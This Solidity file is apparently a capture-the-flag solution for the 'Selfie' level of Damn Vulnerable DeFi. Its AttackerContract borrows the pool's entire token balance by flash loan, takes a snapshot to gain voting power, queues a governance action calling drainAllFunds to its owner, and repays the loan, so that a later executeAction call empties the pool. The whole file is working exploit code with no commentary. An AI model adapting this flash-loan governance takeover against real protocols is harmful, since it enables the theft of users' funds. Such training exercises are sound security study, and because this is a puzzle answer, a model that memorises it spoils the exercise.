// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {Ownable} from "openzeppelin-contracts/access/Ownable.sol";
import {Address} from "openzeppelin-contracts/utils/Address.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
import "forge-std/console.sol";

interface ISelfiePool {
    function flashLoan(uint256 borrowAmount) external;
    function drainAllFunds(address receiver) external;
    function token() external view returns (address);
    function governance() external view returns (address);
}

interface ISimpleGovernance {
    event ActionExecuted(uint256 actionId, address indexed caller);
    event ActionQueued(uint256 actionId, address indexed caller);

    function actions(uint256)
        external
        view
        returns (address receiver, bytes memory data, uint256 weiAmount, uint256 proposedAt, uint256 executedAt);
    function executeAction(uint256 actionId) external payable;
    function getActionDelay() external pure returns (uint256);
    function governanceToken() external view returns (address);
    function queueAction(address receiver, bytes memory data, uint256 weiAmount) external returns (uint256);
}

interface IDamnValuableTokenSnapshot {
    function snapshot() external returns (uint256);
    function getBalanceAtLastSnapshot(address account) external view returns (uint256);
    function getTotalSupplyAtLastSnapshot() external view returns (uint256);
}

contract AttackerContract is Ownable {
    using Address for address;
    using Address for address payable;

    error OnlyGovernanceAllowed();

    ISelfiePool private selfiePool;
    ISimpleGovernance private simpleGovernance;
    uint256 private actionId;

    constructor(address _selfiePool, address _simpleGovernance) {
        require(_selfiePool.isContract(), "_selfiePool is not a contract");
        require(_simpleGovernance.isContract(), " _simpleGovernance is not a contract");
        selfiePool = ISelfiePool(_selfiePool);
        simpleGovernance = ISimpleGovernance(_simpleGovernance);
    }

    function attack() external onlyOwner {
        address token = selfiePool.token();
        uint256 borrowAmount = IERC20(token).balanceOf(address(selfiePool));
        selfiePool.flashLoan(borrowAmount);
    }

    function executeAction() external onlyOwner {
        simpleGovernance.executeAction(actionId);
    }

    function receiveTokens(address token, uint256 amount) external {
        if (msg.sender != address(selfiePool)) {
            revert OnlyGovernanceAllowed();
        }
        IDamnValuableTokenSnapshot(token).snapshot();

        uint256 balance = IERC20(token).balanceOf(address(this));
        console.log("Flashloan amount received: %s", balance);
        actionId = simpleGovernance.queueAction(
            address(selfiePool), abi.encodeWithSignature("drainAllFunds(address)", owner()), 0
        );

        IERC20(token).transfer(address(selfiePool), amount);
    }

    receive() external payable {}
}
